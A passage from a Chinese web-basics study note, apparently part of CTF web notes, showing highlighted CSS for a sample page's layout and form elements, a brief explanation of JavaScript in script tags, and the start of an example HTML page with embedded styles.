</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#note-ctf-web-__codelineno-4-28"></a><span class="w">    </span><span class="k">text-decoration</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="p">;</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#note-ctf-web-__codelineno-4-29"></a><span class="p">}</span>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#note-ctf-web-__codelineno-4-30"></a>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#note-ctf-web-__codelineno-4-31"></a><span class="nt">main</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#note-ctf-web-__codelineno-4-32"></a><span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#note-ctf-web-__codelineno-4-33"></a><span class="p">}</span>
</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#note-ctf-web-__codelineno-4-34"></a>
</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#note-ctf-web-__codelineno-4-35"></a><span class="nt">section</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#note-ctf-web-__codelineno-4-36"></a><span class="w">    </span><span class="k">margin-bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#note-ctf-web-__codelineno-4-37"></a><span class="p">}</span>
</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#note-ctf-web-__codelineno-4-38"></a>
</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#note-ctf-web-__codelineno-4-39"></a><span class="p">.</span><span class="nc">intro</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#note-ctf-web-__codelineno-4-40"></a><span class="w">    </span><span class="k">font-style</span><span class="p">:</span><span class="w"> </span><span class="kc">italic</span><span class="p">;</span>
</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#note-ctf-web-__codelineno-4-41"></a><span class="w">    </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#555</span><span class="p">;</span>
</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#note-ctf-web-__codelineno-4-42"></a><span class="p">}</span>
</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#note-ctf-web-__codelineno-4-43"></a>
</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#note-ctf-web-__codelineno-4-44"></a><span class="nt">footer</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#note-ctf-web-__codelineno-4-45"></a><span class="w">    </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#333</span><span class="p">;</span>
</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#note-ctf-web-__codelineno-4-46"></a><span class="w">    </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#note-ctf-web-__codelineno-4-47"></a><span class="w">    </span><span class="k">text-align</span><span class="p">:</span><span class="w"> </span><span class="kc">center</span><span class="p">;</span>
</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#note-ctf-web-__codelineno-4-48"></a><span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#note-ctf-web-__codelineno-4-49"></a><span class="w">    </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">fixed</span><span class="p">;</span>
</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#note-ctf-web-__codelineno-4-50"></a><span class="w">    </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#note-ctf-web-__codelineno-4-51"></a><span class="w">    </span><span class="k">bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#note-ctf-web-__codelineno-4-52"></a><span class="p">}</span>
</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53" href="#note-ctf-web-__codelineno-4-53"></a>
</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54" href="#note-ctf-web-__codelineno-4-54"></a><span class="c">/* 表单样式 */</span>
</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55" href="#note-ctf-web-__codelineno-4-55"></a><span class="nt">form</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56" href="#note-ctf-web-__codelineno-4-56"></a><span class="w">    </span><span class="k">margin-top</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57" href="#note-ctf-web-__codelineno-4-57"></a><span class="p">}</span>
</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58" href="#note-ctf-web-__codelineno-4-58"></a>
</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59" href="#note-ctf-web-__codelineno-4-59"></a><span class="nt">form</span><span class="w"> </span><span class="nt">label</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-60"><a id="__codelineno-4-60" name="__codelineno-4-60" href="#note-ctf-web-__codelineno-4-60"></a><span class="w">    </span><span class="k">display</span><span class="p">:</span><span class="w"> </span><span class="kc">block</span><span class="p">;</span>
</span><span id="__span-4-61"><a id="__codelineno-4-61" name="__codelineno-4-61" href="#note-ctf-web-__codelineno-4-61"></a><span class="w">    </span><span class="k">margin-bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-62"><a id="__codelineno-4-62" name="__codelineno-4-62" href="#note-ctf-web-__codelineno-4-62"></a><span class="p">}</span>
</span><span id="__span-4-63"><a id="__codelineno-4-63" name="__codelineno-4-63" href="#note-ctf-web-__codelineno-4-63"></a>
</span><span id="__span-4-64"><a id="__codelineno-4-64" name="__codelineno-4-64" href="#note-ctf-web-__codelineno-4-64"></a><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span><span class="o">],</span>
</span><span id="__span-4-65"><a id="__codelineno-4-65" name="__codelineno-4-65" href="#note-ctf-web-__codelineno-4-65"></a><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;email&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-66"><a id="__codelineno-4-66" name="__codelineno-4-66" href="#note-ctf-web-__codelineno-4-66"></a><span class="w">    </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span><span id="__span-4-67"><a id="__codelineno-4-67" name="__codelineno-4-67" href="#note-ctf-web-__codelineno-4-67"></a><span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-68"><a id="__codelineno-4-68" name="__codelineno-4-68" href="#note-ctf-web-__codelineno-4-68"></a><span class="w">    </span><span class="k">margin-bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-69"><a id="__codelineno-4-69" name="__codelineno-4-69" href="#note-ctf-web-__codelineno-4-69"></a><span class="w">    </span><span class="k">border</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="kt">px</span><span class="w"> </span><span class="kc">solid</span><span class="w"> </span><span class="mh">#ccc</span><span class="p">;</span>
</span><span id="__span-4-70"><a id="__codelineno-4-70" name="__codelineno-4-70" href="#note-ctf-web-__codelineno-4-70"></a><span class="w">    </span><span class="k">border-radius</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-71"><a id="__codelineno-4-71" name="__codelineno-4-71" href="#note-ctf-web-__codelineno-4-71"></a><span class="p">}</span>
</span><span id="__span-4-72"><a id="__codelineno-4-72" name="__codelineno-4-72" href="#note-ctf-web-__codelineno-4-72"></a>
</span><span id="__span-4-73"><a id="__codelineno-4-73" name="__codelineno-4-73" href="#note-ctf-web-__codelineno-4-73"></a><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-74"><a id="__codelineno-4-74" name="__codelineno-4-74" href="#note-ctf-web-__codelineno-4-74"></a><span class="w">    </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#333</span><span class="p">;</span>
</span><span id="__span-4-75"><a id="__codelineno-4-75" name="__codelineno-4-75" href="#note-ctf-web-__codelineno-4-75"></a><span class="w">    </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
</span><span id="__span-4-76"><a id="__codelineno-4-76" name="__codelineno-4-76" href="#note-ctf-web-__codelineno-4-76"></a><span class="w">    </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-77"><a id="__codelineno-4-77" name="__codelineno-4-77" href="#note-ctf-web-__codelineno-4-77"></a><span class="w">    </span><span class="k">border</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="p">;</span>
</span><span id="__span-4-78"><a id="__codelineno-4-78" name="__codelineno-4-78" href="#note-ctf-web-__codelineno-4-78"></a><span class="w">    </span><span class="k">border-radius</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-4-79"><a id="__codelineno-4-79" name="__codelineno-4-79" href="#note-ctf-web-__codelineno-4-79"></a><span class="w">    </span><span class="k">cursor</span><span class="p">:</span><span class="w"> </span><span class="kc">pointer</span><span class="p">;</span>
</span><span id="__span-4-80"><a id="__codelineno-4-80" name="__codelineno-4-80" href="#note-ctf-web-__codelineno-4-80"></a><span class="p">}</span>
</span><span id="__span-4-81"><a id="__codelineno-4-81" name="__codelineno-4-81" href="#note-ctf-web-__codelineno-4-81"></a>
</span><span id="__span-4-82"><a id="__codelineno-4-82" name="__codelineno-4-82" href="#note-ctf-web-__codelineno-4-82"></a><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="o">]</span><span class="p">:</span><span class="nd">hover</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-83"><a id="__codelineno-4-83" name="__codelineno-4-83" href="#note-ctf-web-__codelineno-4-83"></a><span class="w">    </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#555</span><span class="p">;</span>
</span><span id="__span-4-84"><a id="__codelineno-4-84" name="__codelineno-4-84" href="#note-ctf-web-__codelineno-4-84"></a><span class="p">}</span>
</span></code></pre></div>
</details>
<ul>
<li>JS<ul>
<li>包裹在<code>&lt;script&gt;</code>中</li>
<li>可以做什么：嵌入网页中，让网页具备高级的交互逻辑</li>
</ul>
</li>
</ul>
<details class="note">
<summary>Note</summary>
<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-ctf-web-__codelineno-5-1"></a><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-ctf-web-__codelineno-5-2"></a><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;zh-CN&quot;</span><span class="p">&gt;</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-ctf-web-__codelineno-5-3"></a><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#note-ctf-web-__codelineno-5-4"></a>    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#note-ctf-web-__codelineno-5-5"></a>    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>现代Web开发示例<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#note-ctf-web-__codelineno-5-6"></a>    <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#note-ctf-web-__codelineno-5-7"></a><span class="w">        </span><span class="c">/* CSS 样式 */</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#note-ctf-web-__codelineno-5-8"></a><span class="w">        </span><span class="nt">body</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#note-ctf-web-__codelineno-5-9"></a><span class="w">            </span><span class="k">font-family</span><span class="p">:</span><span class="w"> </span><span class="n">Arial</span><span class="p">,</span><span class="w"> </span><span class="kc">sans-serif</span><span class="p">;</span>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#note-ctf-web-__codelineno-5-10"></a><span class="w">            </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#note-ctf-web-__codelineno-5-11"></a><span class="w">            </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#note-ctf-web-__codelineno-5-12"></a><span class="w">            </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#f4f4f4</span><span class="p">;</span>
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#note-ctf-web-__codelineno-5-13"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#note-ctf-web-__codelineno-5-14"></a>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#note-ctf-web-__codelineno-5-15"></a><span class="w">        </span><span class="nt">header</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#note-ctf-web-__codelineno-5-16"></a><span class="w">            </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#333</span><span class="p">;</span>
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#note-ctf-web-__codelineno-5-17"></a><span class="w">            </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#note-ctf-web-__codelineno-5-18"></a><span class="w">            </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#note-ctf-web-__codelineno-5-19"></a><span class="w">            </span><span class="k">text-align</span><span class="p">:</span><span class="w"> </span><span class="kc">center</span><span class="p">;</span>
</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#note-ctf-web-__codelineno-5-20"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#note-ctf-web-__codelineno-5-21"></a>
</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#note-ctf-web-__codelineno-5-22"></a><span class="w">        </span><span class="nt">nav</span><span class="w"> </span><span class="nt">ul</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#note-ctf-web-__codelineno-5-23"></a><span class="w">            </span><span class="k">list-style</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="p">;</span>
</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#note-ctf-web-__codelineno-5-24"></a><span class="w">            </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#note-ctf-web-__codelineno-5-25"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#note-ctf-web-__codelineno-5-26"></a>
</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#note-ctf-web-__codelineno-5-27"></a><span class="w">        </span><span class="nt">nav</span><span class="w"> </span><span class="nt">ul</span><span class="w"> </span><span class="nt">li</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#note-ctf-web-__codelineno-5-28"></a><span class="w">            </span><span class="k">display</span><span class="p">:</span><span class="w"> </span><span class="kc">inline</span><span class="p">;</span>
</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#note-ctf-web-__codelineno-5-29"></a><span class="w">            </span><span class="k">margin</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#note-ctf-web-__codelineno-5-30"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#note-ctf-web-__codelineno-5-31"></a>
</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#note-ctf-web-__codelineno-5-32"></a><span class="w">        </span><span class="nt">nav</span><span class="w"> </span><span class="nt">ul</span><span class="w"> </span><span class="nt">li</span><span class="w"> </span><span class="nt">a</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#note-ctf-web-__codelineno-5-33"></a><span class="w">            </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#note-ctf-web-__codelineno-5-34"></a><span class="w">            </span><span class="k">text-decoration</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="p">;</span>
</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35" href="#note-ctf-web-__codelineno-5-35"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36" href="#note-ctf-web-__codelineno-5-36"></a>
</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37" href="#note-ctf-web-__codelineno-5-37"></a><span class="w">        </span><span class="nt">main</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38" href="#note-ctf-web-__codelineno-5-38"></a><span class="w">            </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39" href="#note-ctf-web-__codelineno-5-39"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40" href="#note-ctf-web-__codelineno-5-40"></a>
</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41" href="#note-ctf-web-__codelineno-5-41"></a><span class="w">        </span><span class="nt">section</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42" href="#note-ctf-web-__codelineno-5-42"></a><span class="w">            </span><span class="k">margin-bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-43"><a id="__codelineno-5-43" name="__codelineno-5-43" href="#note-ctf-web-__codelineno-5-43"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-44"><a id="__codelineno-5-44" name="__codelineno-5-44" href="#note-ctf-web-__codelineno-5-44"></a>
</span><span id="__span-5-45"><a id="__codelineno-5-45" name="__codelineno-5-45" href="#note-ctf-web-__codelineno-5-45"></a><span class="w">        </span><span class="p">.</span><span class="nc">intro</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-46"><a id="__codelineno-5-46" name="__codelineno-5-46" href="#note-ctf-web-__codelineno-5-46"></a><span class="w">            </span><span class="k">font-style</span><span class="p">:</span><span class="w"> </span><span class="kc">italic</span><span class="p">;</span>
</span><span id="__span-5-47"><a id="__codelineno-5-47" name="__codelineno-5-47" href="#note-ctf-web-__codelineno-5-47"></a><span class="w">            </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#555</span><span class="p">;</span>
</span><span id="__span-5-48"><a id="__codelineno-5-48" name="__codelineno-5-48" href="#note-ctf-web-__codelineno-5-48"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-49"><a id="__codelineno-5-49" name="__codelineno-5-49" href="#note-ctf-web-__codelineno-5-49"></a>
</span><span id="__span-5-50"><a id="__codelineno-5-50" name="__codelineno-5-50" href="#note-ctf-web-__codelineno-5-50"></a><span class="w">        </span><span class="nt">footer</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-51"><a id="__codelineno-5-51" name="__codelineno-5-51" href="#note-ctf-web-__codelineno-5-51"></a><span class="w">            </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#333</span><span class="p">;</span>
</span><span id="__span-5-52"><a id="__codelineno-5-52" name="__codelineno-5-52" href="#note-ctf-web-__codelineno-5-52"></a><span class="w">            </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
</span><span id="__span-5-53"><a id="__codelineno-5-53" name="__codelineno-5-53" href="#note-ctf-web-__codelineno-5-53"></a><span class="w">            </span><span class="k">text-align</span><span class="p">:</span><span class="w"> </span><span class="kc">center</span><span class="p">;</span>
</span><span id="__span-5-54"><a id="__codelineno-5-54" name="__codelineno-5-54" href="#note-ctf-web-__codelineno-5-54"></a><span class="w">            </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-5-55"><a id="__codelineno-5-55" name="__codelineno-5-55" href="#note-ctf-web-__codelineno-5-55"></a><span class="w">            </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">fixed</span><span class="p">;</span>
</span><span id="__span-5-56"><a id="__codelineno-5-56" name="__codelineno-5-56" href="#note-ctf-web-__codelineno-5-56"></a><span class="w">            </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span><span id="__span-5-57"><a id="__codelineno-5-57" name="__codelineno-5-57" href="#note-ctf-web-__codelineno-5-57"></a><span class="w">            </span><span class="k">bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-5-58"><a id="__codelineno-5-58" name="__codelineno-5-58" href="#note-ctf-web-__codelineno-5-58"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-59"><a id="__codelineno-5-59" name="__codelineno-5-59" href="#note-ctf-web-__codelineno-5-59"></a>
</span><span id="__span-5-60"><a id="__codelineno-5-60" name="__codelineno-5-60" href="#note-ctf-web-__codelineno-5-60"></a><span class="w">        </span><span class="nt">form</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-61"><a id="__codelineno-5-61" name="__codelineno-5-61" href="#note-ctf-web-__codelineno-5-61"></a><span class="w">            </span><span class="k">margin-top</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-62"><a id="__codelineno-5-62" name="__codelineno-5-62" href="#note-ctf-web-__codelineno-5-62"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-63"><a id="__codelineno-5-63" name="__codelineno-5-63" href="#note-ctf-web-__codelineno-5-63"></a>
</span><span id="__span-5-64"><a id="__codelineno-5-64" name="__codelineno-5-64" href="#note-ctf-web-__codelineno-5-64"></a><span class="w">        </span><span class="nt">form</span><span class="w"> </span><span class="nt">label</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-65"><a id="__codelineno-5-65" name="__codelineno-5-65" href="#note-ctf-web-__codelineno-5-65"></a><span class="w">            </span><span class="k">display</span><span class="p">:</span><span class="w"> </span><span class="kc">block</span><span class="p">;</span>
</span><span id="__span-5-66"><a id="__codelineno-5-66" name="__codelineno-5-66" href="#note-ctf-web-__codelineno-5-66"></a><span class="w">            </span><span class="k">margin-bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-67"><a id="__codelineno-5-67" name="__codelineno-5-67" href="#note-ctf-web-__codelineno-5-67"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-68"><a id="__codelineno-5-68" name="__codelineno-5-68" href="#note-ctf-web-__codelineno-5-68"></a>
</span><span id="__span-5-69"><a id="__codelineno-5-69" name="__codelineno-5-69" href="#note-ctf-web-__codelineno-5-69"></a><span class="w">        </span><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span><span class="o">],</span>
</span><span id="__span-5-70"><a id="__codelineno-5-70" name="__codelineno-5-70" href="#note-ctf-web-__codelineno-5-70"></a><span class="w">        </span><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;email&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-71"><a id="__codelineno-5-71" name="__codelineno-5-71" href="#note-ctf-web-__codelineno-5-71"></a><span class="w">            </span><span class="k">width</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
</span><span id="__span-5-72"><a id="__codelineno-5-72" name="__codelineno-5-72" href="#note-ctf-web-__codelineno-5-72"></a><span class="w">            </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-73"><a id="__codelineno-5-73" name="__codelineno-5-73" href="#note-ctf-web-__codelineno-5-73"></a><span class="w">            </span><span class="k">margin-bottom</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-74"><a id="__codelineno-5-74" name="__codelineno-5-74" href="#note-ctf-web-__codelineno-5-74"></a><span class="w">            </span><span class="k">border</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="kt">px</span><span class="w"> </span><span class="kc">solid</span><span class="w"> </span><span class="mh">#ccc</span><span class="p">;</span>
</span><span id="__span-5-75"><a id="__codelineno-5-75" name="__codelineno-5-75" href="#note-ctf-web-__codelineno-5-75"></a><span class="w">            </span><span class="k">border-radius</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-76"><a id="__codelineno-5-76" name="__codelineno-5-76" href="#note-ctf-web-__codelineno-5-76"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-77"><a id="__codelineno-5-77" name="__codelineno-5-77" href="#note-ctf-web-__codelineno-5-77"></a>
</span><span id="__span-5-78"><a id="__codelineno-5-78" name="__codelineno-5-78" href="#note-ctf-web-__codelineno-5-78"></a><span class="w">        </span><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-79"><a id="__codelineno-5-79" name="__codelineno-5-79" href="#note-ctf-web-__codelineno-5-79"></a><span class="w">            </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#333</span><span class="p">;</span>
